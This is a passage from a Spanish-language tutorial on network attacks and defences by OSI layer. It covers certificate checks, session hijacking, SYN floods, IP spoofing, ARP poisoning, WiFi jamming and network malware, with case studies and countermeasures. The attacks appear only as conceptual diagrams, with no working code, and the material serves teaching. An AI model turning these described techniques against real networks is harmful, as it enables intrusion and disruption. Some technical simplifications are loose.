├─────────────────────────────────────────────────────────────┤
│                                                             │
│  NAVEGADORES WEB:                                           │
│  • Chrome: Click en candado → "Certificate"               │
│  • Firefox: Click en candado → "View Certificate"         │
│  • Safari: Click en candado → "Show Certificate"          │
│  • Edge: Click en candado → "Certificate"                 │
│                                                             │
│  LÍNEA DE COMANDOS:                                         │
│  • openssl s_client -connect sitio.com:443 -servername sitio.com │
│  • openssl x509 -in certificado.crt -text -noout           │
│  • nmap --script ssl-cert sitio.com                        │
│  • curl -vI https://sitio.com                              │
│                                                             │
│  HERRAMIENTAS ONLINE:                                       │
│  • SSL Labs (ejemplo-ssl-labs.com/ssltest/)                         │
│  • SSL Checker (ejemplo-ssl-checker.com/ssl-checker.html)          │
│  • What's My Chain Cert? (ejemplo-chain-cert.com)            │
│  • Certificate Transparency (ejemplo-crt.sh)                      │
│                                                             │
│  APLICACIONES ESPECIALIZADAS:                              │
│  • TestSSL.sh (testssl.sh)                                 │
│  • SSLyze (github.com/nabla-c0d3/sslyze)                  │
│  • Nmap NSE scripts                                        │
│  • Burp Suite (para testing)                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**EJEMPLO PRÁCTICO DE VALIDACIÓN:**

```
┌─────────────────────────────────────────────────────────────┐
│              EJEMPLO: VALIDACIÓN DE WWW.NANCOEJEMPLO.COM           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. CONEXIÓN INICIAL:                                       │
│  $ openssl s_client -connect www.nancoejemplo.com:443             │
│  CONNECTED(00000003)                                        │
│  depth=2 C = US, O = CertAuth Ejemplo Inc, CN = CertAuth Global Root CA │
│  depth=1 C = US, O = CertAuth Ejemplo Inc, CN = CertAuth SHA2 High Assurance Server CA │
│  depth=0 C = CL, ST = Ciudad Ejemplo, L = Ciudad Ejemplo, O = Nanco Ejemplo, CN = www.nancoejemplo.cl │
│                                                             │
│  2. VERIFICACIÓN DE CADENA:                                │
│  ✓ Certificado raíz: CertAuth Global Root CA               │
│  ✓ Certificado intermedio: CertAuth SHA2 High Assurance   │
│  ✓ Certificado sitio: www.nancoejemplo.cl                     │
│                                                             │
│  3. VERIFICACIÓN DE DOMINIO:                               │
│  ✓ Subject: CN = www.nancoejemplo.cl                         │
│  ✓ SAN: DNS:www.nancoejemplo.cl, DNS:nancoejemplo.cl          │
│  ✓ Dominio coincide con el solicitado                     │
│                                                             │
│  4. VERIFICACIÓN DE FECHA:                                 │
│  ✓ Not Before: Dec 15 00:00:00 2023 GMT                   │
│  ✓ Not After : Dec 15 23:59:59 2024 GMT                    │
│  ✓ Certificado válido (no expirado)                        │
│                                                             │
│  5. VERIFICACIÓN DE REVOCACIÓN:                            │
│  ✓ OCSP Response: Good                                      │
│  ✓ Certificado no revocado                                 │
│                                                             │
│  RESULTADO: ✅ CERTIFICADO VÁLIDO                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**2. Implementación de TLS 1.3:**
- **¿Qué es?** Última versión del protocolo TLS con mejoras de seguridad
- **¿Cómo funciona?** Usa algoritmos de encriptación más fuertes y elimina protocolos débiles
- **Ejemplo:** Configurar servidores para usar solo TLS 1.3
- **Beneficio:** Comunicaciones más seguras, menos vulnerabilidades

**3. Certificate Pinning:**
- **¿Qué es?** Fijar certificados específicos en aplicaciones
- **¿Cómo funciona?** La app solo acepta certificados predefinidos
- **Ejemplo:** App bancaria que solo acepta certificados de su banco
- **Beneficio:** Previene ataques de certificados falsos

**4. Monitoreo de Protocolos Seguros:**
- **¿Qué es?** Vigilancia de comunicaciones SSL/TLS para detectar anomalías
- **¿Cómo funciona?** Analiza el tráfico encriptado para detectar patrones sospechosos
- **Ejemplo:** Detectar intentos de downgrade de TLS
- **Beneficio:** Detección temprana de ataques a protocolos seguros
















## Capa 5: Sesión - Ataques de Protocolos de Sesión

### ¿Qué es la Capa 5 y por qué es importante?

La **Capa 5 (Sesión)** maneja el **establecimiento, mantenimiento y terminación** de conexiones entre aplicaciones. Es como el "coordinador de reuniones" de la red.

**¿Qué hace la Capa 5?**
- **Establece** conexiones entre aplicaciones
- **Mantiene** el estado de las sesiones activas
- **Sincroniza** la comunicación entre sistemas
- **Termina** conexiones de forma ordenada

**Analogía del Mundo Real:**
Imagina que la Capa 5 es como un **coordinador de conferencias**:
- **Organiza** cuándo empiezan y terminan las reuniones
- **Mantiene** el orden de los participantes
- **Asegura** que todos estén conectados correctamente
- **Cierra** las sesiones cuando terminan

### ¿Qué es RPC y por qué es crítico?

**RPC = Remote Procedure Call (Llamada a Procedimiento Remoto)**

**¿Qué hace RPC?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE RPC                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLIENTE: "Ejecuta este comando en el servidor"            │
│                                                             │
│  RPC: Envía la solicitud al servidor remoto                │
│                                                             │
│  SERVIDOR: Ejecuta el comando y devuelve el resultado      │
│                                                             │
│  RESULTADO: Cliente recibe la respuesta                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **RPC permite** que programas se comuniquen entre diferentes computadoras
- **Es fundamental** para servicios como impresión en red, archivos compartidos
- **Si se compromete**, el atacante puede ejecutar comandos en sistemas remotos

**¿Por qué está en Capa 5?**
RPC es un **protocolo de sesión** que:
- **Establece** conexiones entre cliente y servidor
- **Mantiene** el estado de las llamadas remotas
- **Coordina** la comunicación entre aplicaciones distribuidas

### Diagrama de Ataque: RPC Hijacking

```
┌─────────────────────────────────────────────────────────────┐
│                    CAPA 5: SESIÓN                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLIENTE LEGÍTIMO      ATACANTE        SERVIDOR RPC        │
│        │                  │              │                │
│        │ 1. Establece      │              │                │
│        │    conexión RPC   │              │                │
│        │                  │              │                │
│        │ 2. Atacante       │              │                │
│        │    intercepta     │              │                │
│        │    llamadas RPC   │              │                │
│        │                  │              │                │
│        │ 3. Inyecta        │              │                │
│        │    llamadas       │              │                │
│        │    maliciosas     │              │                │
│        │                  │              │                │
│        │ 4. Ejecuta        │              │                │
│        │    comandos       │              │                │
│        │    remotos        │              │                │
│        │                  │              │                │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales de Red:**

**1. Session Hijacking (Secuestro de Sesiones):**
- **¿Qué es?** Robar una sesión activa de un usuario legítimo
- **¿Cómo funciona?** El atacante captura el ID de sesión y lo usa como si fuera el usuario
- **Ejemplo:** Robar la sesión de un usuario logueado en su banco
- **Impacto:** Acceso no autorizado a cuentas, robo de datos

**2. Session Fixation (Fijación de Sesión):**
- **¿Qué es?** Forzar a un usuario a usar un ID de sesión específico conocido por el atacante
- **¿Cómo funciona?** El atacante predetermina el ID de sesión antes del login
- **Ejemplo:** Enviar un enlace con ID de sesión fijo para robar credenciales
- **Impacto:** Acceso no autorizado después del login del usuario

**3. Session Replay (Reproducción de Sesión):**
- **¿Qué es?** Grabar una sesión completa y reproducirla más tarde
- **¿Cómo funciona?** El atacante captura toda la comunicación y la repite
- **Ejemplo:** Grabar una transacción bancaria y repetirla múltiples veces
- **Impacto:** Transacciones duplicadas, acceso no autorizado

**4. RPC Hijacking (Secuestro de RPC):**
- **¿Qué es?** Interceptar y modificar llamadas a procedimientos remotos
- **¿Cómo funciona?** El atacante se posiciona entre cliente y servidor RPC
- **Ejemplo:** Modificar comandos que se ejecutan en servidores remotos
- **Impacto:** Ejecución de comandos no autorizados, acceso a sistemas

**5. NetBIOS Attacks (Ataques a NetBIOS):**
- **¿Qué es?** Comprometer servicios de red de Windows
- **¿Cómo funciona?** Explotar vulnerabilidades en el protocolo NetBIOS
- **Ejemplo:** Acceder a archivos compartidos sin autorización
- **Impacto:** Acceso no autorizado a recursos de red, robo de datos

**Contramedidas de Red:**

**1. SSL/TLS para Encriptación de Sesiones:**
- **¿Qué es?** Encriptar toda la comunicación de sesión
- **¿Cómo funciona?** Usar protocolos seguros para proteger las sesiones
- **Ejemplo:** HTTPS para todas las comunicaciones web
- **Beneficio:** Protege contra interceptación de sesiones

**2. Tokens de Sesión Únicos:**
- **¿Qué es?** Identificadores únicos y aleatorios para cada sesión
- **¿Cómo funciona?** Generar tokens diferentes cada vez que alguien se conecta
- **Ejemplo:** Token de sesión que cambia cada login
- **Beneficio:** Previene reutilización de sesiones robadas

**3. Timeouts Automáticos:**
- **¿Qué es?** Expiración automática de sesiones después de un tiempo
- **¿Cómo funciona?** Cerrar sesiones inactivas automáticamente
- **Ejemplo:** Sesión bancaria que expira después de 15 minutos
- **Beneficio:** Limita el tiempo de uso de sesiones robadas

**4. Regeneración de IDs de Sesión:**
- **¿Qué es?** Cambiar el ID de sesión periódicamente durante la sesión
- **¿Cómo funciona?** Generar nuevos IDs sin cerrar la sesión
- **Ejemplo:** Cambiar ID de sesión después de cada transacción importante
- **Beneficio:** Hace más difícil robar sesiones activas

**5. Firewalls de Aplicación para Protocolos Específicos:**
- **¿Qué es?** Firewalls especializados en protocolos de sesión
- **¿Cómo funciona?** Analizar y filtrar tráfico RPC, NetBIOS específicamente
- **Ejemplo:** Bloquear llamadas RPC no autorizadas
- **Beneficio:** Previene ataques específicos a protocolos de sesión

## Capa 4: Transporte - Ataques de Conexión

### ¿Qué es la Capa 4 y por qué es importante?

La **Capa 4 (Transporte)** se encarga de **garantizar la comunicación confiable** entre aplicaciones. Es como el "sistema de mensajería" que asegura que los paquetes lleguen completos y en orden.

**¿Qué hace la Capa 4?**
- **Establece** conexiones confiables entre aplicaciones
- **Controla** el flujo de datos (no saturar al receptor)
- **Recupera** datos perdidos o corruptos
- **Reordena** paquetes que llegan fuera de secuencia

**Analogía del Mundo Real:**
Imagina que la Capa 4 es como un **servicio de mensajería premium**:
- **Garantiza** que el paquete llegue completo
- **Confirma** la entrega con el remitente
- **Reenvía** si algo se pierde en el camino
- **Mantiene** el orden de los envíos

### ¿Qué es TCP y por qué es crítico?

**TCP = Transmission Control Protocol (Protocolo de Control de Transmisión)**

**¿Qué hace TCP?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE TCP                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLIENTE: "Quiero conectarme al servidor"                  │
│                                                             │
│  TCP: Envía SYN (solicitud de conexión)                    │
│                                                             │
│  SERVIDOR: Responde SYN-ACK (acepta conexión)              │
│                                                             │
│  CLIENTE: Envía ACK (confirma conexión)                    │
│                                                             │
│  RESULTADO: Conexión establecida (3-way handshake)         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **TCP es la base** de la mayoría de servicios web (HTTP, HTTPS, FTP)
- **Garantiza** que los datos lleguen completos y en orden
- **Si se compromete**, el atacante puede interrumpir servicios críticos

**¿Por qué está en Capa 4?**
TCP es un **protocolo de transporte** que:
- **Establece** conexiones confiables entre aplicaciones
- **Maneja** la recuperación de errores de red
- **Controla** el flujo de datos para evitar saturación

### Diagrama de Ataque: SYN Flood

```
┌─────────────────────────────────────────────────────────────┐
│                  CAPA 4: TRANSPORTE                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ATACANTE                    SERVIDOR                      │
│     │                          │                           │
│     │ 1. Envía múltiples       │                           │
│     │    paquetes SYN          │                           │
│     │                          │                           │
│     │ 2. Servidor responde     │                           │
│     │    con SYN-ACK           │                           │
│     │                          │                           │
│     │ 3. Atacante NO responde  │                           │
│     │    con ACK               │                           │
│     │                          │                           │
│     │ 4. Conexiones quedan     │                           │
│     │    en estado             │                           │
│     │    SYN-RECEIVED          │                           │
│     │                          │                           │
│     │ 5. Se agotan recursos    │                           │
│     │    del servidor          │                           │
│     │                          │                           │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales:**
- **SYN Flooding**: Sobreflujo de solicitudes de conexión TCP
- **Port Scanning**: Escaneo de puertos para identificar servicios
- **TCP Sequence Number Prediction**: Predicción de números de secuencia
- **UDP Flooding**: Sobreflujo de paquetes UDP

**Contramedidas:**
- Firewalls de estado
- SYN cookies
- Rate limiting
- Monitoreo de conexiones

## Capa 3: Red - Ataques de Enrutamiento

### ¿Qué es la Capa 3 y por qué es importante?

La **Capa 3 (Red)** se encarga del **enrutamiento de paquetes** entre redes diferentes. Es como el "sistema de GPS" que decide qué ruta tomar para llegar al destino.

**¿Qué hace la Capa 3?**
- **Enruta** paquetes entre redes diferentes
- **Asigna** direcciones IP únicas a cada dispositivo
- **Fragmenta** paquetes grandes en piezas más pequeñas
- **Reensambla** paquetes en el destino

**Analogía del Mundo Real:**
Imagina que la Capa 3 es como el **sistema de carreteras y GPS**:
- **Planifica** la mejor ruta para llegar al destino
- **Usa** direcciones únicas (como direcciones IP)
- **Desvía** el tráfico si hay problemas en la ruta
- **Conecta** diferentes ciudades (redes)

### ¿Qué es IP y por qué es crítico?

**IP = Internet Protocol (Protocolo de Internet)**

**¿Qué hace IP?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE IP                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PAQUETE: "Datos para enviar"                              │
│                                                             │
│  IP AGREGA: Dirección origen (192.168.1.100)               │
│             Dirección destino (8.8.8.8)                    │
│                                                             │
│  ROUTER: Decide la mejor ruta                              │
│                                                             │
│  RESULTADO: Paquete llega al destino                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **IP es la base** de toda comunicación en Internet
- **Permite** que dispositivos se comuniquen globalmente
- **Si se compromete**, el atacante puede redirigir tráfico o suplantar identidades

**¿Por qué está en Capa 3?**
IP es un **protocolo de red** que:
- **Proporciona** direccionamiento lógico global
- **Maneja** el enrutamiento entre redes
- **Es independiente** del medio físico de transmisión

### Diagrama de Ataque: IP Spoofing

```
┌─────────────────────────────────────────────────────────────┐
│                    CAPA 3: RED                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ATACANTE           ROUTER           SERVIDOR LEGÍTIMO     │
│     │                  │                    │              │
│     │ 1. Cambia IP      │                    │              │
│     │    origen         │                    │              │
│     │    (spoofing)     │                    │              │
│     │                  │                    │              │
│     │ 2. Envía          │                    │              │
│     │    paquetes       │                    │              │
│     │    falsificados   │                    │              │
│     │                  │                    │              │
│     │ 3. Router         │                    │              │
│     │    acepta         │                    │              │
│     │    paquetes       │                    │              │
│     │                  │                    │              │
│     │ 4. Acceso         │                    │              │
│     │    no autorizado  │                    │              │
│     │                  │                    │              │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales:**
- **IP Spoofing**: Falsificación de direcciones IP
- **Man-in-the-Middle**: Interceptación de comunicaciones
- **DDoS/DoS**: Ataques de denegación de servicio
- **Route Poisoning**: Envenenamiento de tablas de enrutamiento

**Contramedidas:**
- Firewalls de red
- Filtrado de paquetes
- Implementación de BCP38
- Monitoreo de tráfico

## Capa 2: Enlace de Datos - Ataques de Red Local

### ¿Qué es la Capa 2 y por qué es importante?

La **Capa 2 (Enlace de Datos)** maneja la **comunicación entre dispositivos en la misma red local**. Es como el "sistema de direcciones de barrio" que conoce a todos los vecinos.

**¿Qué hace la Capa 2?**
- **Transmite** frames de datos entre dispositivos conectados directamente
- **Controla** el acceso al medio de transmisión (cable o WiFi)
- **Detecta** y corrige errores de transmisión
- **Identifica** dispositivos por direcciones MAC únicas

**Analogía del Mundo Real:**
Imagina que la Capa 2 es como el **sistema de direcciones de un barrio**:
- **Conoce** a todos los vecinos por su dirección (MAC)
- **Entrega** paquetes directamente a la puerta correcta
- **Evita** conflictos cuando dos personas quieren usar la calle al mismo tiempo
- **Asegura** que el paquete llegue al vecino correcto

### ¿Qué es ARP y por qué es crítico?

**ARP = Address Resolution Protocol (Protocolo de Resolución de Direcciones)**

**¿Qué hace ARP?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE ARP                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DISPOSITIVO: "¿Cuál es la MAC de 192.168.1.1?"            │
│                                                             │
│  ARP: Envía pregunta a toda la red local                   │
│                                                             │
│  ROUTER: "Mi IP es 192.168.1.1, mi MAC es AA:BB:CC:DD:EE:FF" │
│                                                             │
│  RESULTADO: Dispositivo guarda la relación IP→MAC          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **ARP traduce** direcciones IP en direcciones MAC físicas
- **Es fundamental** para la comunicación en redes locales
- **Si se compromete**, el atacante puede interceptar todo el tráfico

**¿Por qué está en Capa 2?**
ARP es un **protocolo de enlace** que:
- **Resuelve** direcciones IP en direcciones MAC físicas
- **Funciona** solo dentro de la red local
- **Es esencial** para la comunicación directa entre dispositivos

### Diagrama de Ataque: ARP Poisoning

```
┌─────────────────────────────────────────────────────────────┐
│                CAPA 2: ENLACE DE DATOS                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  VÍCTIMA           ATACANTE           GATEWAY               │
│     │                  │                │                  │
│     │ 1. Solicita       │                │                  │
│     │    MAC del        │                │                  │
│     │    gateway        │                │                  │
│     │                  │                │                  │
│     │ 2. Atacante       │                │                  │
│     │    responde       │                │                  │
│     │    con MAC        │                │                  │
│     │    falsa          │                │                  │
│     │                  │                │                  │
│     │ 3. Víctima       │                │                  │
│     │    actualiza      │                │                  │
│     │    tabla ARP      │                │                  │
│     │                  │                │                  │
│     │ 4. Todo tráfico   │                │                  │
│     │    pasa por       │                │                  │
│     │    atacante       │                │                  │
│     │                  │                │                  │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales:**
- **MAC Spoofing**: Falsificación de direcciones MAC
- **ARP Poisoning**: Envenenamiento de tabla ARP
- **VLAN Hopping**: Salto entre VLANs
- **DHCP Spoofing**: Falsificación de servidor DHCP

**Contramedidas:**
- Port Security
- VLANs
- 802.1X
- ARP monitoring

## Capa 1: Física - Ataques de Infraestructura

### ¿Qué es la Capa 1 y por qué es importante?

La **Capa 1 (Física)** se encarga de la **transmisión de bits a través del medio físico**. Es como las "carreteras y calles" por donde circulan los datos.

**¿Qué hace la Capa 1?**
- **Transmite** bits (0s y 1s) por cables o ondas de radio
- **Define** las características físicas del medio (cable, WiFi, fibra)
- **Convierte** datos digitales en señales físicas
- **Maneja** la sincronización de la transmisión

**Analogía del Mundo Real:**
Imagina que la Capa 1 es como el **sistema de carreteras físicas**:
- **Son las calles** por donde circulan los autos (datos)
- **Definen** el tipo de superficie (asfalto, tierra, puente)
- **Controlan** la velocidad máxima y capacidad
- **Pueden** ser bloqueadas o interrumpidas físicamente

### ¿Qué es WiFi y por qué es crítico?

**WiFi = Wireless Fidelity (Fidelidad Inalámbrica)**

**¿Qué hace WiFi?**
```
┌─────────────────────────────────────────────────────────────┐
│                    FUNCIÓN DE WIFI                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DATOS DIGITALES: "Hola mundo"                             │
│                                                             │
│  WIFI CONVIERTE: En ondas de radio                         │
│                                                             │
│  TRANSMISIÓN: Por el aire a 2.4GHz o 5GHz                  │
│                                                             │
│  RECEPTOR: Convierte ondas de vuelta a datos               │
│                                                             │
│  RESULTADO: "Hola mundo" recibido                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**¿Por qué es crítico?**
- **WiFi es la base** de la conectividad móvil moderna
- **Permite** acceso a Internet sin cables
- **Si se compromete**, el atacante puede bloquear comunicaciones o interceptar datos

**¿Por qué está en Capa 1?**
WiFi es un **protocolo físico** que:
- **Define** cómo se transmiten las ondas de radio
- **Especifica** frecuencias y modulación
- **Maneja** la transmisión física de datos por el aire

### Diagrama de Ataque: WiFi Jamming

```
┌─────────────────────────────────────────────────────────────┐
│                  CAPA 1: FÍSICA                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DISPOSITIVOS WIFI        JAMMER           PUNTO DE ACCESO │
│        │                    │                    │          │
│        │ 1. Intentan        │                    │          │
│        │    conectarse      │                    │          │
│        │                    │                    │          │
│        │ 2. Jammer          │                    │          │
│        │    transmite       │                    │          │
│        │    ruido en        │                    │          │
│        │    misma           │                    │          │
│        │    frecuencia      │                    │          │
│        │                    │                    │          │
│        │ 3. Señal WiFi      │                    │          │
│        │    se pierde       │                    │          │
│        │                    │                    │          │
│        │ 4. Dispositivos    │                    │          │
│        │    no pueden       │                    │          │
│        │    conectarse       │                    │          │
│        │                    │                    │          │
└─────────────────────────────────────────────────────────────┘
```

**Ataques Principales:**
- **Jamming**: Bloqueo de señales inalámbricas
- **Cable Tapping**: Pinchado de cables
- **Physical Access**: Acceso físico no autorizado
- **Sabotage**: Corte de cables o desconexión de equipos

**Contramedidas:**
- Control de acceso físico
- Cableado blindado
- Monitoreo de infraestructura
- Separación de redes sensibles

## Análisis de Flujo de Ataque Completo

### Diagrama: Ataque Multi-Capa de Red

```
┌─────────────────────────────────────────────────────────────┐
│                    ATAQUE MULTI-CAPA DE RED                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CAPA 7: DNS Poisoning → CAPA 6: SSL Downgrade →          │
│  CAPA 5: Session Hijacking → CAPA 4: SYN Flood →        │
│  CAPA 3: IP Spoofing → CAPA 2: ARP Poisoning →          │
│  CAPA 1: Physical Access                                 │
│                                                           │
│  FLUJO DEL ATAQUE DE RED:                                │
│                                                           │
│  1. Acceso físico (Capa 1)                               │
│  2. ARP Poisoning (Capa 2)                               │
│  3. IP Spoofing (Capa 3)                                 │
│  4. SYN Flood (Capa 4)                                   │
│  5. Session Hijacking (Capa 5)                           │
│  6. SSL Downgrade (Capa 6)                               │
│  7. DNS Poisoning (Capa 7)                               │
│                                                             │
│  RESULTADO: Compromiso completo de la infraestructura      │
│             de red                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## Conclusiones

Los ataques pueden ocurrir en cualquier capa del modelo OSI, y los atacantes sofisticados suelen combinar técnicas de múltiples capas para lograr sus objetivos. La defensa en profundidad requiere implementar contramedidas en cada capa, no solo en las capas superiores.

## Malware en Redes: Propagación por Capas OSI

### Introducción al Malware de Red

El malware de red se especializa en comprometer y propagarse a través de la infraestructura de red. A diferencia del malware de aplicación, este tipo de malware se enfoca en explotar vulnerabilidades de protocolos de red, servicios de red y dispositivos de red.

### Malware Específico de Redes Inalámbricas

#### 1. WiFi Malware

```
┌─────────────────────────────────────────────────────────────┐
│                    MALWARE WIFI                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DISPOSITIVO INFECTADO      RED WIFI        OTROS DISPOSITIVOS │
│        │                        │                    │      │
│        │ 1. Se conecta a       │                    │      │
│        │    red WiFi           │                    │      │
│        │                        │                    │      │
│        │ 2. Escanea otros       │                    │      │
│        │    dispositivos        │                    │      │
│        │    en la red           │                    │      │
│        │                        │                    │      │
│        │ 3. Propaga malware    │                    │      │
│        │    por WiFi            │                    │      │
│        │                        │                    │      │
│        │ 4. Crea botnet         │                    │      │
│        │    inalámbrica         │                    │      │
│        │                        │                    │      │
└─────────────────────────────────────────────────────────────┘
```

**Tipos de Malware WiFi:**
- **WiFi Worms**: Se propagan automáticamente entre dispositivos WiFi
- **Rogue AP Malware**: Crea puntos de acceso maliciosos
- **WiFi Sniffers**: Capturan tráfico inalámbrico
- **Deauthentication Malware**: Desconecta dispositivos de la red

**Contramedidas:**
- Segmentación de redes WiFi
- Monitoreo de dispositivos conectados
- Detección de puntos de acceso maliciosos
- Encriptación WPA3

#### 2. Botnets Inalámbricas

```
┌─────────────────────────────────────────────────────────────┐
│                    BOTNET INALÁMBRICA                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  COMANDO Y CONTROL           BOTNET WIFI                   │
│        │                        │                          │
│        │ 1. Envía comandos      │                          │
│        │    a dispositivos      │                          │
│        │    infectados           │                          │
│        │                        │                          │
│        │ 2. Dispositivos        │                          │
│        │    ejecutan ataques     │                          │
│        │    coordinados          │                          │
│        │                        │                          │
│        │ 3. Ataques DDoS        │                          │
│        │    desde múltiples     │                          │
│        │    puntos WiFi          │                          │
│        │                        │                          │
│        │ 4. Difícil de          │                          │
│        │    rastrear            │                          │
│        │                        │                          │
└─────────────────────────────────────────────────────────────┘
```

### Malware por Capa OSI de Red

#### Capa 7: Malware de Protocolos de Red

**Tipos específicos:**
- **DNS Malware**: Compromete servidores DNS para redirigir tráfico
- **Email Gateway Malware**: Compromete gateways de email para interceptar comunicaciones
- **FTP/SFTP Malware**: Explota protocolos de transferencia de archivos
- **SSH Malware**: Compromete acceso remoto seguro

#### Capa 6: Malware de Presentación de Red

**Tipos específicos:**
- **SSL/TLS Malware**: Explota vulnerabilidades en protocolos seguros de red
- **Certificate Stealers**: Roban certificados digitales de dispositivos de red
- **Encoding Malware**: Usa técnicas de codificación para evadir detección en tráfico de red

#### Capa 5: Malware de Protocolos de Sesión

**Tipos específicos:**
- **Session Hijacking Malware**: Roba sesiones de red
- **RPC Malware**: Explota llamadas a procedimientos remotos
- **NetBIOS Malware**: Compromete servicios de red Windows

#### Capa 4: Malware de Transporte

**Tipos específicos:**
- **Port Scanners**: Buscan puertos abiertos para infección
- **TCP/UDP Flooders**: Realizan ataques DoS
- **Connection Hijackers**: Secuestran conexiones TCP

#### Capa 3: Malware de Red

**Tipos específicos:**
- **Network Worms**: Se propagan por vulnerabilidades de red
- **IP Spoofers**: Falsifican direcciones IP
- **Routing Malware**: Corrompe tablas de enrutamiento

#### Capa 2: Malware de Enlace

**Tipos específicos:**
- **ARP Poisoners**: Envenenan tablas ARP
- **MAC Spoofers**: Falsifican direcciones MAC
- **VLAN Hoppers**: Saltan entre VLANs
- **DHCP Malware**: Falsifica servidores DHCP

#### Capa 1: Malware Físico

**Tipos específicos:**
- **WiFi Jammers**: Bloquean señales inalámbricas
- **Signal Interceptors**: Capturan señales físicas
- **Hardware Trojans**: Comprometen dispositivos de red

### Métodos de Propagación por Red

#### Propagación Automática

```
┌─────────────────────────────────────────────────────────────┐
│                PROPAGACIÓN AUTOMÁTICA                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DISPOSITIVO INFECTADO                                      │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                                                     │   │
│  │ 1. Escaneo de red                                    │   │
│  │    • Busca dispositivos vulnerables                │   │
│  │    • Identifica servicios abiertos                  │   │
│  │                                                     │   │
│  │ 2. Explotación                                       │   │
│  │    • Usa vulnerabilidades conocidas                 │   │
│  │    • Ejecuta exploits automáticos                   │   │
│  │                                                     │   │
│  │ 3. Infección                                         │   │
│  │    • Instala malware en nuevo dispositivo           │   │
│  │    • Establece persistencia                         │   │
│  │                                                     │   │
│  │ 4. Propagación                                       │   │
│  │    • Repite proceso en nuevos dispositivos          │   │
│  │    • Crea red de dispositivos infectados            │   │
│  │                                                     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Propagación por Medios Físicos

```
┌─────────────────────────────────────────────────────────────┐
│                PROPAGACIÓN FÍSICA                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  MEDIO FÍSICO               DISPOSITIVO                    │
│  ┌─────────────────┐        ┌─────────────────┐            │
│  │                 │        │                 │            │
│  │ USB Infectado   │ ──────▶│ Auto-ejecución  │            │
│  │                 │        │                 │            │
│  │ CD/DVD Malicioso│ ──────▶│ Instalación     │            │            │
│  │                 │        │ automática      │            │
│  │ WiFi Direct     │ ──────▶│ Propagación     │            │
│  │                 │        │ inalámbrica      │            │
│  │ Bluetooth       │ ──────▶│ Conexión        │            │
│  │                 │        │ automática      │            │
│  └─────────────────┘        └─────────────────┘            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Detección y Prevención de Malware en Redes

#### Detección por Capa

```
┌─────────────────────────────────────────────────────────────┐
│                DETECCIÓN POR CAPA                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CAPA 7: WAF + Análisis de logs de aplicación              │
│  CAPA 6: Monitoreo de certificados + Análisis SSL/TLS     │
│  CAPA 5: Detección de sesiones anómalas + Monitoreo RPC    │
│  CAPA 4: IDS/IPS + Análisis de tráfico TCP/UDP             │
│  CAPA 3: Firewalls de red + Análisis de paquetes IP        │
│  CAPA 2: Port Security + Monitoreo ARP + VLANs            │
│  CAPA 1: Control de acceso físico + Monitoreo WiFi       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Contramedidas Específicas

**Para Redes Inalámbricas:**
- WIDS/WIPS (Wireless Intrusion Detection/Prevention Systems)
- Segmentación de redes WiFi
- Monitoreo de dispositivos conectados
- Detección de puntos de acceso maliciosos

**Para Redes Cableadas:**
- Network Access Control (NAC)
- Segmentación de red con VLANs
- Monitoreo de tráfico de red
- Análisis de comportamiento de red

### Casos de Estudio: Malware en Redes

#### Caso 1: Mirai Botnet (IoT)

**Características:**
- Infectó dispositivos IoT a través de credenciales por defecto
- Creó botnet masiva para ataques DDoS
- Se propagó por SSH y Telnet

**Lecciones:**
- Importancia de cambiar credenciales por defecto
- Necesidad de segmentar dispositivos IoT
- Monitoreo de tráfico anómalo

#### Caso 2: WannaCry (Redes Corporativas)

**Características:**
- Se propagó por vulnerabilidad SMB (Capa 5)
- Afectó redes corporativas globalmente
- Usó EternalBlue exploit

**Lecciones:**
- Importancia de parches de seguridad
- Necesidad de segmentación de red
- Backup y recuperación críticos

### Conclusiones sobre Seguridad en Redes

Los ataques de red pueden ocurrir en cualquier capa del modelo OSI, y los atacantes sofisticados suelen combinar técnicas de múltiples capas para comprometer la infraestructura de red. La defensa en profundidad requiere implementar contramedidas específicas de red en cada capa.

**Principios Clave de Seguridad en Redes:**
1. **Defensa en profundidad de red**: Múltiples capas de protección específicas para infraestructura
2. **Principio de menor privilegio de red**: Acceso mínimo necesario a servicios de red
3. **Monitoreo continuo de tráfico**: Detección en tiempo real de anomalías de red
4. **Respuesta rápida a incidentes de red**: Mitigación inmediata de amenazas de red
